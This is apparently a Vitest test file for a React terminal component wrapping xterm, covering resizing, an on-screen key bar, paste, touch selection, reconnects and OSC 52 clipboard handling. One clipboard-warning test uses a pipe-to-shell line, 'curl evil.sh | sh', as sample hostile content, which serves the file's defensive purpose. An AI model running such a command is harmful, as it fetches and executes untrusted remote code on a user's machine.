import { act, fireEvent, render, renderHook, screen, waitFor } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';

const h = vi.hoisted(() => ({
  term: null as null | {
    written: unknown[]; dataCb: ((d: string) => void) | null; binaryCb: ((d: string) => void) | null; disposed: boolean; resetCount: number; flush(): void;
    cols: number; rows: number; fontFamilySets: unknown[];
    keyHandler: ((e: KeyboardEvent) => boolean) | null; modes: { bracketedPasteMode: boolean };
    selectionCb: (() => void) | null; selection: string; opts: Record<string, unknown>;
    options: Record<string, unknown>; textarea: HTMLTextAreaElement; focusCount: number; blurCount: number;
    selected: unknown[]; scrolled: number[]; lines: string[]; focus(): void;
  },
  clipboard: null as null | { readText(s: string): string; writeText(s: string, t: string): Promise<void> },
  sock: null as null | { handlers: Record<string, (...a: unknown[]) => void>; sent: string[]; binary: string[]; open: boolean; resizes: string[]; disposed: boolean; connected: boolean; retries: number },
}));

vi.mock('@xterm/xterm', () => ({
  Terminal: class {
    cols = 80;
    rows = 24;
    written: unknown[] = [];
    dataCb: ((d: string) => void) | null = null;
    disposed = false;
    resetCount = 0;
    fontFamilySets: unknown[] = [];
    keyHandler: ((e: KeyboardEvent) => boolean) | null = null;
    modes = { bracketedPasteMode: true };
    opts: Record<string, unknown>;
    options: Record<string, unknown>;
    constructor(opts: Record<string, unknown>) {
      this.opts = opts;
      h.term = this;
      const sets = this.fontFamilySets;
      this.options = new Proxy({ ...opts }, { set(t, k, v) { if (k === 'fontFamily') sets.push(v); t[k as string] = v; return true; } });
    }
    attachCustomKeyEventHandler(fn: (e: KeyboardEvent) => boolean) { this.keyHandler = fn; }
    selectionCb: (() => void) | null = null;
    selection = '';
    onSelectionChange(cb: () => void) { this.selectionCb = cb; return { dispose() {} }; }
    hasSelection() { return this.selection !== ''; }
    getSelection() { return this.selection; }
    loadAddon() {}
    textarea = document.createElement('textarea');
    open(el: HTMLElement) { el.appendChild(this.textarea); }
    focusCount = 0;
    blurCount = 0;
    focus() { this.focusCount++; this.textarea.focus(); }
    blur() { this.blurCount++; this.textarea.blur(); }
    paste(text: string) { this.dataCb?.(`\x1b[200~${text}\x1b[201~`); }
    selected: unknown[] = [];
    select(col: number, row: number, len: number) { this.selected.push([col, row, len]); this.selection = 'web/src/main.tsx'; }
    clearSelection() { this.selection = ''; }
    scrolled: number[] = [];
    scrollLines(n: number) { this.scrolled.push(n); }
    lines: string[] = [];
    buffer = { active: { viewportY: 100, getLine: (y: number) => ({ translateToString: () => this.lines[y - 100] ?? '' }) } };
    callbacks: (() => void)[] = [];
    write(d: unknown, cb?: () => void) { this.written.push(d); if (cb) this.callbacks.push(cb); }
    /** Simulates xterm finishing parsing everything written so far. */
    flush() { this.callbacks.splice(0).forEach((cb) => cb()); }
    reset() { this.resetCount++; }
    onData(cb: (d: string) => void) { this.dataCb = cb; return { dispose() {} }; }
    binaryCb: ((d: string) => void) | null = null;
    onBinary(cb: (d: string) => void) { this.binaryCb = cb; return { dispose: () => { this.binaryCb = null; } }; }
    dispose() { this.disposed = true; }
  },
}));
vi.mock('@xterm/addon-fit', () => ({ FitAddon: class { fit() {} } }));
vi.mock('@xterm/addon-web-links', () => ({ WebLinksAddon: class {} }));
vi.mock('./linkSpan', () => ({ linkUnderliner: () => ({ show() {}, clear() {}, dispose() {} }) }));
vi.mock('@xterm/addon-clipboard', () => ({
  ClipboardAddon: class {
    constructor(_b: unknown, provider: NonNullable<typeof h.clipboard>) { h.clipboard = provider; }
  },
}));
vi.mock('./ptySocket', () => ({
  ptyUrl: (id: string) => `ws://test/${id}`,
  PtySocket: class {
    handlers: Record<string, (...a: unknown[]) => void>;
    sent: string[] = [];
    disposed = false;
    connected = false;
    retries = 0;
    constructor(_url: string, handlers: Record<string, (...a: unknown[]) => void>) {
      this.handlers = handlers;
      h.sock = this;
    }
    connect() { this.connected = true; }
    open = true;
    send(d: string) {
      if (!this.open) return false;
      this.sent.push(d);
      return true;
    }
    binary: string[] = [];
    sendBinary(d: string) {
      if (!this.open) return false;
      this.binary.push(d);
      return true;
    }
    resizes: string[] = [];
    resize(cols: number, rows: number) { this.resizes.push(`${cols}x${rows}`); }
    retry() { this.retries++; }
    dispose() { this.disposed = true; }
  },
}));

import { createRef } from 'react';
import { TerminalView, type TerminalHandle } from './TerminalView';
import { Toaster } from '@ui';
import { setTerminalFontSize } from './fontSize';
import { usePrefixKeys } from '../workspaces/keys';
import { stubClipboard, stubProperty } from '../test-utils';

describe('TerminalView sizing', () => {
  it('refits once per frame, tells the PTY only real size changes, and remeasures once the font loads', async () => {
    let observed: (() => void) | null = null;
    vi.stubGlobal('ResizeObserver', class { constructor(cb: () => void) { observed = cb; } observe() {} disconnect() {} });
    const frames: FrameRequestCallback[] = [];
    vi.stubGlobal('requestAnimationFrame', (cb: FrameRequestCallback) => frames.push(cb));
    vi.stubGlobal('cancelAnimationFrame', () => {});
    let fontLoaded: () => void = () => {};
    // jsdom has no FontFaceSet.
    stubProperty(document, 'fonts', { load: () => new Promise<void>((r) => { fontLoaded = r; }) });
    const { unmount } = render(<TerminalView sessionId="s1" />);
    expect(h.sock!.resizes).toEqual(['80x24']);
    observed!();
    observed!();
    expect(frames).toHaveLength(1);
    frames.splice(0).forEach((f) => f(0));
    expect(h.sock!.resizes).toEqual(['80x24']);
    h.term!.rows = 30;
    observed!();
    frames.splice(0).forEach((f) => f(0));
    expect(h.sock!.resizes).toEqual(['80x24', '80x30']);
    await act(async () => fontLoaded());
    expect(h.term!.fontFamilySets).toHaveLength(2);
    h.term!.rows = 28;
    frames.splice(0).forEach((f) => f(0));
    expect(h.sock!.resizes).toEqual(['80x24', '80x30', '80x28']);
    unmount();
  });
});

describe('TerminalView', () => {
  it('wires the socket to the terminal and cleans up', () => {
    const { unmount } = render(<TerminalView sessionId="s1" />);
    expect(h.sock!.connected).toBe(true);
    h.sock!.handlers.onReset();
    h.sock!.handlers.onReady();
    h.sock!.handlers.onData(new Uint8Array([104, 105]), false);
    expect(h.term!.resetCount).toBe(1);
    expect(h.term!.written).toHaveLength(1);
    h.term!.dataCb!('ls\r');
    expect(h.sock!.sent).toEqual(['ls\r']);
    h.sock!.handlers.onExit(3);
    expect(String(h.term!.written.at(-1))).toContain('exited with code 3');
    unmount();
    expect(h.sock!.disposed).toBe(true);
    expect(h.term!.disposed).toBe(true);
  });

  it('sends binary input (old-style mouse reports) as bytes, after the replay', () => {
    const { unmount } = render(<TerminalView sessionId="s1" />);
    h.sock!.handlers.onReset();
    h.term!.binaryCb!('\x1b[M \xa0!');
    expect(h.sock!.binary).toEqual([]);
    h.sock!.handlers.onReady();
    h.term!.binaryCb!('\x1b[M \xa0!');
    expect(h.sock!.binary).toEqual(['\x1b[M \xa0!']);
    expect(h.sock!.sent).toEqual([]);
    unmount();
    expect(h.term!.binaryCb).toBeNull();
  });

  it('recolours an open terminal when the theme changes', async () => {
    const root = document.documentElement;
    root.style.setProperty('--pdt-bg', '#ffffff');
    const { unmount } = render(<TerminalView sessionId="s1" />);
    expect((h.term!.opts.theme as { background: string }).background).toBe('#ffffff');
    root.style.setProperty('--pdt-bg', '#000000');
    root.setAttribute('data-theme', 'dark');
    await waitFor(() => expect((h.term!.options.theme as { background: string }).background).toBe('#000000'));
    unmount();
    root.removeAttribute('data-theme');
    root.removeAttribute('style');
  });

  it('does not send answers to replayed terminal queries', () => {
    render(<TerminalView sessionId="s1" />);
    h.sock!.handlers.onReset();
    h.sock!.handlers.onData(new TextEncoder().encode('\x1b[6n'), true);
    h.term!.dataCb!('\x1b[12;1R'); // xterm answering the replayed query
    h.sock!.handlers.onReady();
    h.term!.dataCb!('\x1b[12;1R'); // xterm has not finished parsing the replay yet
    expect(h.sock!.sent).toEqual([]);
    h.term!.flush();
    h.term!.dataCb!('ls\r');
    h.sock!.handlers.onData(new TextEncoder().encode('\x1b[6n'), false);
    h.term!.dataCb!('\x1b[3;1R'); // a live query is answered
    expect(h.sock!.sent).toEqual(['ls\r', '\x1b[3;1R']);
  });

  it('shows a quiet indicator while reconnecting and when the session ended', () => {
    render(<TerminalView sessionId="s1" sessionStatus="running" />);
    expect(screen.queryByText(/Reconnecting/)).not.toBeInTheDocument();
    act(() => (h.sock!.handlers.onStatus as (s: string) => void)('reconnecting'));
    expect(screen.getByText('Reconnecting…')).toBeInTheDocument();
    act(() => (h.sock!.handlers.onStatus as (s: string) => void)('ended'));
    expect(screen.queryByText(/Reconnecting/)).not.toBeInTheDocument();
    expect(screen.getByText('Session ended.')).toBeInTheDocument();
  });

  it('sends raw key sequences from the on-screen key bar', () => {
    render(<TerminalView sessionId="s1" />);
    fireEvent.click(screen.getByRole('button', { name: 'Escape' }));
    fireEvent.click(screen.getByRole('button', { name: 'Up' }));
    fireEvent.click(screen.getByRole('button', { name: 'Control C' }));
    expect(h.sock!.sent).toEqual(['\x1b', '\x1b[A', '\x03']);
  });

  describe('key bar', () => {
    it('has a sticky Ctrl that applies to the next key typed or tapped', () => {
      render(<TerminalView sessionId="s1" />);
      const ctrl = screen.getByRole('button', { name: 'Control' });
      fireEvent.click(ctrl);
      expect(ctrl).toHaveAttribute('aria-pressed', 'true');
      act(() => h.term!.dataCb!('r'));
      expect(ctrl).toHaveAttribute('aria-pressed', 'false');
      act(() => h.term!.dataCb!('r'));
      fireEvent.click(ctrl);
      act(() => h.term!.dataCb!('C'));
      fireEvent.click(ctrl);
      fireEvent.click(screen.getByRole('button', { name: 'Up' }));
      fireEvent.click(screen.getByRole('button', { name: 'Escape' }));
      expect(h.sock!.sent).toEqual(['\x12', 'r', '\x03', '\x1b[1;5A', '\x1b']);
    });

    it('tapping Ctrl twice lets go of it', () => {
      render(<TerminalView sessionId="s1" />);
      const ctrl = screen.getByRole('button', { name: 'Control' });
      fireEvent.click(ctrl);
      fireEvent.click(ctrl);
      expect(ctrl).toHaveAttribute('aria-pressed', 'false');
      act(() => h.term!.dataCb!('r'));
      expect(h.sock!.sent).toEqual(['r']);
    });

    it('⌃] runs the next typed key as a PDT shortcut, and sends Ctrl+] when tapped twice', () => {
      const onAction = vi.fn();
      renderHook(() => usePrefixKeys(onAction));
      render(<TerminalView sessionId="s1" />);
      const prefix = screen.getByRole('button', { name: 'PDT prefix (Control ])' });
      fireEvent.click(prefix);
      expect(prefix).toHaveAttribute('aria-pressed', 'true');
      act(() => h.term!.dataCb!('n'));
      expect(onAction).toHaveBeenCalledWith({ type: 'next' });
      expect(h.sock!.sent).toEqual([]);
      fireEvent.click(prefix);
      fireEvent.click(prefix);
      expect(h.sock!.sent).toEqual(['\x1d']);
    });

    it('⌨ hides and shows the keyboard, and keys leave it hidden', () => {
      render(<TerminalView sessionId="s1" />);
      act(() => h.term!.focus());
      const kb = screen.getByRole('button', { name: 'Hide keyboard' });
      fireEvent.click(kb);
      expect(h.term!.blurCount).toBe(1);
      expect(screen.getByRole('button', { name: 'Show keyboard' })).toBeInTheDocument();
      const focusCount = h.term!.focusCount;
      fireEvent.click(screen.getByRole('button', { name: 'Tab' }));
      expect(h.term!.focusCount).toBe(focusCount);
      fireEvent.click(screen.getByRole('button', { name: 'Show keyboard' }));
      expect(h.term!.focusCount).toBe(focusCount + 1);
      expect(screen.getByRole('button', { name: 'Hide keyboard' })).toBeInTheDocument();
    });
  });

  it('pastes the clipboard as a paste through the handle', async () => {
    stubClipboard({ readText: vi.fn().mockResolvedValue('hi') });
    const handle = createRef<TerminalHandle>();
    render(<TerminalView sessionId="s1" handle={handle} />);
    act(() => handle.current!.paste());
    await waitFor(() => expect(h.sock!.sent).toEqual(['\x1b[200~hi\x1b[201~']));
  });

  it('keeps the font size picked, in every terminal', () => {
    render(<TerminalView sessionId="s1" />);
    expect(h.term!.opts.fontSize).toBe(13);
    act(() => setTerminalFontSize(16));
    expect(h.term!.options.fontSize).toBe(16);
    render(<TerminalView sessionId="s2" />);
    expect(h.term!.opts.fontSize).toBe(16);
    act(() => setTerminalFontSize(13));
    expect(localStorage.getItem('pdt.terminal.fontSize')).toBeNull();
  });

  describe('touch', () => {
    const at = (x: number, y: number) => ({ touches: [{ clientX: x, clientY: y }] as unknown as TouchList });
    const setup = () => {
      render(<TerminalView sessionId="s1" />);
      const el = screen.getByTestId('terminal');
      // 80x24 cells of 10x20 px.
      el.getBoundingClientRect = () => ({ left: 0, top: 0, width: 800, height: 480, right: 800, bottom: 480, x: 0, y: 0, toJSON() {} });
      return el;
    };

    it('scrolls the scrollback a line per cell height', () => {
      const el = setup();
      fireEvent.touchStart(el, at(100, 100));
      fireEvent.touchMove(el, at(100, 145));
      fireEvent.touchMove(el, at(100, 165));
      fireEvent.touchEnd(el, { touches: [] });
      expect(h.term!.scrolled).toEqual([-2, -1]);
    });

    it('a long press selects the word under the finger and offers Copy', async () => {
      vi.useFakeTimers();
      const writeText = vi.fn().mockResolvedValue(undefined);
      stubClipboard({ writeText });
      const el = setup();
      h.term!.lines = ['', 'see web/src/main.tsx now'];
      fireEvent.touchStart(el, at(85, 25)); // column 8, row 1
      act(() => vi.advanceTimersByTime(500));
      expect(h.term!.selected).toEqual([[4, 101, 16]]);
      fireEvent.touchEnd(el, { touches: [] });
      vi.useRealTimers();
      fireEvent.click(screen.getByRole('button', { name: 'Copy' }));
      await waitFor(() => expect(writeText).toHaveBeenCalledWith('web/src/main.tsx'));
      expect(screen.queryByRole('toolbar', { name: 'Selection' })).not.toBeInTheDocument();
    });
  });

  it('sends Shift+Enter as a line break instead of Enter', () => {
    render(<TerminalView sessionId="s1" />);
    const ev = (type: string, init: Partial<KeyboardEvent>) =>
      ({ type, key: 'Enter', shiftKey: false, ctrlKey: false, altKey: false, metaKey: false, preventDefault() {}, ...init }) as KeyboardEvent;
    expect(h.term!.keyHandler!(ev('keydown', { shiftKey: true }))).toBe(false);
    expect(h.term!.keyHandler!(ev('keypress', { shiftKey: true }))).toBe(false);
    expect(h.term!.keyHandler!(ev('keydown', {}))).toBe(true);
    expect(h.sock!.sent).toEqual(['\x1b\r']);
  });

  it('sends a composed prompt as one paste followed by Enter', async () => {
    const onClose = vi.fn();
    render(<TerminalView sessionId="s1" composing onComposeClose={onClose} />);
    const box = screen.getByRole('textbox', { name: 'Prompt' });
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled();
    fireEvent.change(box, { target: { value: 'fix it\nthen test' } });
    fireEvent.keyDown(box, { key: 'Enter', metaKey: true });
    expect(h.sock!.sent).toEqual(['\x1b[200~fix it\rthen test\x1b[201~\r']);
    await waitFor(() => expect(box).toHaveValue(''));
    fireEvent.keyDown(box, { key: 'Escape' });
    expect(onClose).toHaveBeenCalled();
  });

  it('keeps a composed prompt and says why when the terminal is not connected', async () => {
    render(<TerminalView sessionId="s1" composing />);
    h.sock!.open = false;
    act(() => (h.sock!.handlers.onStatus as (s: string) => void)('reconnecting'));
    const box = screen.getByRole('textbox', { name: 'Prompt' });
    fireEvent.change(box, { target: { value: 'fix it' } });
    fireEvent.keyDown(box, { key: 'Enter', metaKey: true });
    expect(await screen.findByText(/prompt was not sent/)).toBeInTheDocument();
    expect(box).toHaveValue('fix it');
    expect(h.sock!.sent).toEqual([]);
  });

  it('marks typing that was dropped while reconnecting until it reconnects', () => {
    render(<TerminalView sessionId="s1" sessionStatus="running" />);
    h.sock!.open = false;
    act(() => (h.sock!.handlers.onStatus as (s: string) => void)('reconnecting'));
    expect(screen.getByText('Reconnecting…')).toBeInTheDocument();
    act(() => h.term!.dataCb!('x'));
    expect(screen.getByText('Not connected: input not sent')).toBeInTheDocument();
    h.sock!.open = true;
    act(() => (h.sock!.handlers.onStatus as (s: string) => void)('open'));
    expect(screen.queryByText(/input not sent/)).not.toBeInTheDocument();
  });

  it('copies OSC 52 text to the clipboard but never reveals the clipboard', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ writeText });
    render(<TerminalView sessionId="s1" />);
    await h.clipboard!.writeText('c', 'copied');
    expect(writeText).toHaveBeenCalledWith('copied');
    expect(h.clipboard!.readText('c')).toBe('');
  });

  it('tells the user when a program sets the clipboard, with the start of the text', async () => {
    stubClipboard({ writeText: vi.fn().mockResolvedValue(undefined) });
    render(<><Toaster /><TerminalView sessionId="s1" /></>);
    await act(() => h.clipboard!.writeText('c', `curl evil.sh |\n  sh ${'x'.repeat(100)}`));
    expect(await screen.findByText('The terminal set your clipboard')).toBeInTheDocument();
    expect(screen.getByText(`curl evil.sh | sh ${'x'.repeat(62)}…`)).toBeInTheDocument();
  });

  it('enables the proposed API the wrapped-link underline needs', () => {
    render(<TerminalView sessionId="s1" />);
    expect(h.term!.opts.allowProposedApi).toBe(true);
  });

  it('copies a mouse selection to the clipboard when the mouse is released', () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ writeText });
    render(<TerminalView sessionId="s1" />);
    fireEvent.mouseUp(document);
    expect(writeText).not.toHaveBeenCalled(); // no selection made
    h.term!.selection = 'picked';
    h.term!.selectionCb!();
    fireEvent.mouseUp(document);
    fireEvent.mouseUp(document); // a later click elsewhere doesn't copy again
    expect(writeText).toHaveBeenCalledTimes(1);
    expect(writeText).toHaveBeenCalledWith('picked');
  });

  it('reattaches when the session becomes running again after it ended', () => {
    const status = (s: string) => act(() => (h.sock!.handlers.onStatus as (s: string) => void)(s));
    const { rerender } = render(<TerminalView sessionId="s1" sessionStatus="finished" />);
    status('open');
    rerender(<TerminalView sessionId="s1" sessionStatus="running" />);
    expect(h.sock!.retries).toBe(0);
    status('ended');
    rerender(<TerminalView sessionId="s1" sessionStatus="running" />);
    expect(h.sock!.retries).toBe(0); // a socket change alone never retries
    rerender(<TerminalView sessionId="s1" sessionStatus="interrupted" />);
    rerender(<TerminalView sessionId="s1" sessionStatus="running" />);
    expect(h.sock!.retries).toBe(1);
  });

  describe('reattach safety net', () => {
    const status = (s: string) => act(() => (h.sock!.handlers.onStatus as (s: string) => void)(s));
    afterEach(() => vi.useRealTimers());

    it('retries on a later poll even though the status never visibly changed, at most once per 5 s', () => {
      vi.useFakeTimers({ toFake: ['Date'] });
      vi.setSystemTime(100_000);
      const { rerender } = render(<TerminalView sessionId="s1" sessionStatus="running" polledAt={1} />);
      status('ended'); // the daemon restarted and the terminal connected before the session resumed
      expect(h.sock!.retries).toBe(0);
      rerender(<TerminalView sessionId="s1" sessionStatus="running" polledAt={2} />);
      expect(h.sock!.retries).toBe(1);
      status('ended'); // still not attachable
      vi.setSystemTime(102_000);
      rerender(<TerminalView sessionId="s1" sessionStatus="running" polledAt={3} />);
      expect(h.sock!.retries).toBe(1); // throttled
      vi.setSystemTime(105_500);
      rerender(<TerminalView sessionId="s1" sessionStatus="running" polledAt={4} />);
      expect(h.sock!.retries).toBe(2);
    });

    it('does not retry on polls while the terminal is attached or the session is not running', () => {
      vi.useFakeTimers({ toFake: ['Date'] });
      vi.setSystemTime(100_000);
      const { rerender } = render(<TerminalView sessionId="s1" sessionStatus="running" polledAt={1} />);
      status('open');
      rerender(<TerminalView sessionId="s1" sessionStatus="running" polledAt={2} />);
      status('ended');
      vi.setSystemTime(110_000);
      rerender(<TerminalView sessionId="s1" sessionStatus="finished" polledAt={3} />);
      expect(h.sock!.retries).toBe(0);
    });
  });
});
